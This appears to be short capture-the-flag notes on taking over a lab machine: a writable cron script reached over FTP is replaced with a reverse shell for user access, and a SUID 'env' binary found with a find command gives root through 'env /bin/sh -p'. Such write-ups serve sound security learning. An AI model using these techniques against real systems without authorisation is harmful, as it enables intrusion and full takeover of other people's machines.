## Info 
- namelessone

### FTP
- Found `clean.sh` will be executed every minute and is writable.

### SMB
- shares: `pics`
- user: `namelessone`


## Path
### User
1. Since we can write to `clean.sh`, we can upload a reverse shell. Get shell!

### Root
1. `find / -perm -4000 2>/dev/null` found `env` has SUID. According to GTFOBins, we can gain root.
```
$ env /bin/sh -p
# whoami 
root
```

